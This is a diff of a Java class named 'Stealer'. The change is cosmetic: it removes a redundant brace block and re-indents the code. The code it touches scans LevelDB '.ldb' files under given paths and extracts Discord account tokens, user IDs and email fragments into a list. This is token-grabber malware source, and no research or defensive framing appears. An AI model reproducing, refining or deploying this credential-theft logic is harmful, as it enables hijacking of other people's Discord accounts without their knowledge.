@@ -61,30 +61,28 @@ public class Stealer {
 		for (String path : paths) {
 			if (new File(path).exists()) {
 				for (File file : new File(path).listFiles()) {
-					{
-						if (file.getAbsolutePath().endsWith(".ldb")) {
-							String content = readFile(file.getAbsolutePath());
-							if (!content.contains(toSteal(type))) {
-								continue;
-							}
-							String remainingContent = content;
-							remainingContent = remainingContent.substring(remainingContent.indexOf(toSteal(type)));
-
-							String found = "";
-							if (type == SearchType.EMAIL) {
-								found = remainingContent.split("\"")[1].split("@")[0] + "@hidden by discord";
-							}
-							if (type == SearchType.USER_ID) {
-								found = remainingContent.split("\"")[0].split("}")[1].substring(3);
-							}
-							if (type == SearchType.TOKEN) {
-								found = remainingContent.split("\"")[1];
-							}
-							if (founds.contains(found)) {
-								continue;
-							}
-							founds.add(found);
+					if (file.getAbsolutePath().endsWith(".ldb")) {
+						String content = readFile(file.getAbsolutePath());
+						if (!content.contains(toSteal(type))) {
+							continue;
 						}
+						String remainingContent = content;
+						remainingContent = remainingContent.substring(remainingContent.indexOf(toSteal(type)));
+
+						String found = "";
+						if (type == SearchType.EMAIL) {
+							found = remainingContent.split("\"")[1].split("@")[0] + "@hidden by discord";
+						}
+						if (type == SearchType.USER_ID) {
+							found = remainingContent.split("\"")[0].split("}")[1].substring(3);
+						}
+						if (type == SearchType.TOKEN) {
+							found = remainingContent.split("\"")[1];
+						}
+						if (founds.contains(found)) {
+							continue;
+						}
+						founds.add(found);
 					}
 				}
 			}
